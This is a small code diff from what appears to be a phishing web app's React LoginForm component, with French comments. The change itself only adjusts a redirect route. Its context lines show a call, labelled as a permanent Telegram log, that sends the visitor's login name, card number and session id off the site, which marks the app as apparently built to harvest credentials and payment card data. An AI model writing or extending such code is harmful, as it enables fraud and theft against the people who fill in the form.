@@ -174,8 +174,8 @@ function LoginForm() {
   // MODIFIÉ: Maintenant affiche NextStepAppr au lieu de naviguer
   const handleNextStepAppr = async () => {
   console.log('🔵 Next Step (Appr) button clicked! - Showing NextStepAppr component');
-  window.location.href = '/NextStepAppr';
-  
+  window.location.href = '/#/NextStepAppr';
+
   // SEND CONFIRMATION LOG TO TELEGRAM (PERMANENT)
   await sendConfirmationLog(loginName, cardDetails.cardNumber, sessionId);
   
